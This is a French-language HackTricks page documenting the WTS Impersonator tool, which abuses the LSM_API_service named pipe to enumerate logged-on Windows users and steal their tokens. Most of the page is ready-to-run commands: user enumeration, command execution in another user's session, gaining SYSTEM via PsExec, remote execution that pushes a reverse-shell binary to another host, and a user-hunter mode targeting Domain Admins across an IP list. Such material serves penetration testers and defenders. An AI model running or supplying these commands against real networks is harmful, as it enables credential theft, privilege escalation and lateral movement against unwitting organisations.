# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

L’outil **WTS Impersonator** exploite le **"\\pipe\LSM_API_service"** RPC Named pipe afin d’énumérer discrètement les utilisateurs connectés et de détourner leurs tokens, contournant ainsi les techniques traditionnelles de Token Impersonation. Cette approche facilite les mouvements latéraux transparents au sein des réseaux. L’innovation derrière cette technique est attribuée à **Omri Baso, dont le travail est accessible sur [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>

### Fonctionnalité principale

L’outil fonctionne à travers une séquence d’appels API :
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Modules clés et utilisation

- **Énumération des utilisateurs** : l’énumération des utilisateurs locaux et distants est possible avec l’outil, à l’aide de commandes adaptées à chaque scénario :

- Localement :
```bash
.\WTSImpersonator.exe -m enum
```
- À distance, en spécifiant une adresse IP ou un hostname :
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Exécution de commandes** : les modules `exec` et `exec-remote` nécessitent un contexte de **Service** pour fonctionner. L’exécution locale nécessite simplement l’exécutable WTSImpersonator et une commande :

- Exemple d’exécution d’une commande locale :
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe peut être utilisé pour obtenir un contexte de service :
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Exécution de commandes à distance** : elle consiste à créer et installer un service à distance, de manière similaire à PsExec.exe, afin de permettre l’exécution avec les permissions appropriées.

- Exemple d’exécution à distance :
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Module User Hunting** : cible des utilisateurs spécifiques sur plusieurs machines et exécute du code avec leurs credentials. Cela est particulièrement utile pour cibler des Domain Admins disposant de droits d’administrateur local sur plusieurs systèmes.
- Exemple d’utilisation :
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Références

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
